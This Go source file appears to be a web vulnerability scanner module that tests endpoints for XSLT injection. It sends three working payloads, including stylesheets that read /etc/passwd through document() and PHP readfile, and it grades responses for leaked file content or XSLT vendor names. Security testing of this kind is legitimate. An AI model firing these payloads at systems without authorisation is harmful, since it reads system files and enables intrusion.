package xslt

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sort"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
	"github.com/yupiyy/bhyakugan/internal/utils"
)

type XSLTPayload struct {
	Name    string
	Payload string
	Check   string
}

type xsltBaseline struct {
	bodyLower    string
	bodyHash     string
	fingerprint  utils.ResponseFingerprint
	authGateSeen bool
}

type xsltEvidence struct {
	param         string
	payloadName   string
	target        string
	signal        string
	severity      string
	confidence    string
	deterministic bool
	baseHash      string
	attackHash    string
}

var XSLTPayloads = []XSLTPayload{
	{"XSLT Vendor Discovery", `<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property('xsl:vendor')"/></xsl:template></xsl:stylesheet>`, ""},
	{"XSLT File Read (/etc/passwd)", `<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>`, "root:x:"},
	{"XSLT PHP readfile", `<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><body><xsl:value-of select="php:function('readfile','/etc/passwd')" /></body></html>`, "root:x:"},
}

var XSLTVendors = []string{"libxml", "libxslt", "saxon", "xalan", "xerces", "microsoft xml", "msxml"}

// Scan tests for XSLT Injection and reports a single root-cause finding per endpoint.
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if strings.TrimSpace(baseURL) == "" {
		return
	}
	baseURL = ensureTrailingSlash(baseURL)
	params := []string{"xml", "xslt", "xsl", "style", "template"}

	baselines := collectBaselines(baseURL, params, client)
	if len(baselines) == 0 {
		return
	}

	affectedParams := make(map[string]bool)
	allEvidence := make([]xsltEvidence, 0, 8)
	authGateParams := 0

	for _, param := range params {
		base, ok := baselines[param]
		if !ok {
			continue
		}
		if base.authGateSeen {
			authGateParams++
			continue
		}

		for _, p := range XSLTPayloads {
			target, bodyLower, bodyStr, attackHash, fp, ok := requestPayload(baseURL, param, p.Payload, client)
			if !ok {
				continue
			}
			if utils.IsRedirectAwareIdentical(base.fingerprint, fp) {
				continue
			}
			if utils.IsAuthGateFingerprint(fp, bodyLower) {
				continue
			}

			signal, severity, confidence, deterministic, matched := evaluateXSLTSignal(p, bodyLower, bodyStr, base.bodyLower)
			if !matched {
				continue
			}
			if attackHash == base.bodyHash {
				continue
			}

			affectedParams[param] = true
			allEvidence = append(allEvidence, xsltEvidence{
				param:         param,
				payloadName:   p.Name,
				target:        target,
				signal:        signal,
				severity:      severity,
				confidence:    confidence,
				deterministic: deterministic,
				baseHash:      shortHash(base.bodyHash),
				attackHash:    shortHash(attackHash),
			})
		}
	}

	if len(allEvidence) == 0 {
		if authGateParams > 0 && authGateParams == len(baselines) {
			onFound(core.Finding{
				Type:       "Auth-Gated Endpoint (Unauthenticated Scan)",
				Target:     canonicalEndpoint(baseURL),
				Detail:     "Endpoint consistently returns authentication gate behavior (302/401/403 with login/auth redirect patterns). Injection validation skipped until authenticated context is provided.",
				Severity:   "Info",
				Confidence: "noisy",
			})
		}
		return
	}

	representative := pickRepresentativeEvidence(allEvidence, 3)
	overallSeverity := maxSeverity(allEvidence)
	overallConfidence := bestConfidence(allEvidence)
	detail := buildSummaryDetail(affectedParams, representative, len(allEvidence))

	target := canonicalEndpoint(baseURL)
	fmt.Printf("[!] POSITIVE MATCH: XSLT Injection at %s (vectors=%d)\n", target, len(allEvidence))
	onFound(core.Finding{
		Type:       "XSLT Injection",
		Target:     target,
		Detail:     detail,
		Severity:   overallSeverity,
		Confidence: overallConfidence,
	})
}

func evaluateXSLTSignal(p XSLTPayload, bodyLower, bodyStr, baseLower string) (signal, severity, confidence string, deterministic, matched bool) {
	payloadLower := strings.ToLower(p.Payload)
	if strings.Contains(bodyLower, payloadLower) {
		return "", "", "", false, false
	}
	if strings.TrimSpace(bodyLower) == strings.TrimSpace(baseLower) {
		return "", "", "", false, false
	}

	if p.Check != "" {
		checkLower := strings.ToLower(p.Check)
		if strings.Contains(bodyLower, checkLower) && !strings.Contains(baseLower, checkLower) {
			return fmt.Sprintf("Matched deterministic marker: %s", p.Check), "High", "confirmed", true, true
		}
	}

	if p.Name == "XSLT Vendor Discovery" {
		isXSLTContext := strings.Contains(bodyLower, "xmlns:xsl") ||
			strings.Contains(bodyLower, "<?xml") ||
			strings.Contains(bodyLower, "transform") ||
			strings.Contains(bodyLower, "stylesheet") ||
			strings.Contains(bodyLower, "error")
		if !isXSLTContext {
			return "", "", "", false, false
		}
		for _, vendor := range XSLTVendors {
			if strings.Contains(bodyLower, vendor) && !strings.Contains(baseLower, vendor) {
				return fmt.Sprintf("XSLT vendor leaked: %s", vendor), "Medium", "probable", false, true
			}
		}
	}
	return "", "", "", false, false
}

func buildSummaryDetail(affected map[string]bool, reps []xsltEvidence, total int) string {
	params := make([]string, 0, len(affected))
	for p := range affected {
		params = append(params, p)
	}
	sort.Strings(params)

	var b strings.Builder
	b.WriteString("Root Cause: Template Engine Injection\n")
	b.WriteString("Impact:\n")
	b.WriteString(" - XSLT injection execution\n")
	b.WriteString(" - SSTI-style template abuse\n")
	b.WriteString(" - LFI via document()/file-read primitives\n")
	b.WriteString(fmt.Sprintf("Affected parameters: %s\n", strings.Join(params, ", ")))
	b.WriteString(fmt.Sprintf("Representative payload evidence (max 3 of %d vectors):\n", total))

	for i, ev := range reps {
		b.WriteString(fmt.Sprintf("%d. payload=%s param=%s signal=%s fingerprint=%s->%s target=%s\n",
			i+1, ev.payloadName, ev.param, ev.signal, ev.baseHash, ev.attackHash, ev.target))
	}
	return strings.TrimSpace(b.String())
}

func collectBaselines(baseURL string, params []string, client *http.Client) map[string]xsltBaseline {
	out := make(map[string]xsltBaseline, len(params))
	for _, param := range params {
		u, err := url.Parse(baseURL)
		if err != nil {
			continue
		}
		q := u.Query()
		q.Set(param, "bhyakugan_xslt_control")
		u.RawQuery = q.Encode()

		resp, err := client.Get(u.String())
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		resp.Body.Close()
		bodyLower := strings.ToLower(string(body))
		fp := utils.BuildResponseFingerprint(resp, body)
		out[param] = xsltBaseline{
			bodyLower:    bodyLower,
			bodyHash:     hashBytes(body),
			fingerprint:  fp,
			authGateSeen: utils.IsAuthGateFingerprint(fp, bodyLower),
		}
	}
	return out
}

func requestPayload(baseURL, param, payload string, client *http.Client) (target, bodyLower, bodyStr, bodyHash string, fp utils.ResponseFingerprint, ok bool) {
	u, err := url.Parse(baseURL)
	if err != nil {
		return "", "", "", "", utils.ResponseFingerprint{}, false
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	target = u.String()

	resp, err := client.Get(target)
	if err != nil {
		return "", "", "", "", utils.ResponseFingerprint{}, false
	}
	body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
	resp.Body.Close()
	bodyStr = string(body)
	bodyLower = strings.ToLower(bodyStr)
	bodyHash = hashBytes(body)
	fp = utils.BuildResponseFingerprint(resp, body)
	return target, bodyLower, bodyStr, bodyHash, fp, true
}

func pickRepresentativeEvidence(all []xsltEvidence, max int) []xsltEvidence {
	if len(all) == 0 || max <= 0 {
		return nil
	}
	sorted := append([]xsltEvidence(nil), all...)
	sort.SliceStable(sorted, func(i, j int) bool {
		if sorted[i].deterministic != sorted[j].deterministic {
			return sorted[i].deterministic
		}
		ri := severityRank(sorted[i].severity)
		rj := severityRank(sorted[j].severity)
		if ri != rj {
			return ri > rj
		}
		if sorted[i].param != sorted[j].param {
			return sorted[i].param < sorted[j].param
		}
		return sorted[i].payloadName < sorted[j].payloadName
	})
	if len(sorted) > max {
		sorted = sorted[:max]
	}
	return sorted
}

func maxSeverity(all []xsltEvidence) string {
	best := "Info"
	for _, ev := range all {
		if severityRank(ev.severity) > severityRank(best) {
			best = ev.severity
		}
	}
	return normalizeSeverity(best)
}

func bestConfidence(all []xsltEvidence) string {
	best := "noisy"
	bestRank := confidenceRank(best)
	for _, ev := range all {
		rank := confidenceRank(ev.confidence)
		if rank > bestRank {
			best = ev.confidence
			bestRank = rank
		}
	}
	return strings.ToLower(strings.TrimSpace(best))
}

func severityRank(sev string) int {
	switch normalizeSeverity(sev) {
	case "Critical":
		return 5
	case "High":
		return 4
	case "Medium":
		return 3
	case "Low":
		return 2
	default:
		return 1
	}
}

func normalizeSeverity(sev string) string {
	switch strings.ToLower(strings.TrimSpace(sev)) {
	case "critical":
		return "Critical"
	case "high":
		return "High"
	case "medium":
		return "Medium"
	case "low":
		return "Low"
	default:
		return "Info"
	}
}

func confidenceRank(conf string) int {
	switch strings.ToLower(strings.TrimSpace(conf)) {
	case "confirmed":
		return 3
	case "probable":
		return 2
	default:
		return 1
	}
}

func hashBytes(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

func shortHash(h string) string {
	if len(h) < 12 {
		return h
	}
	return h[:12]
}

func ensureTrailingSlash(u string) string {
	if strings.HasSuffix(u, "/") {
		return u
	}
	return u + "/"
}

func canonicalEndpoint(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		if idx := strings.Index(raw, "?"); idx != -1 {
			return raw[:idx]
		}
		return raw
	}
	u.RawQuery = ""
	u.Fragment = ""
	clean := u.String()
	if strings.HasSuffix(clean, "/") && u.Path != "/" {
		return strings.TrimSuffix(clean, "/")
	}
	return clean
}
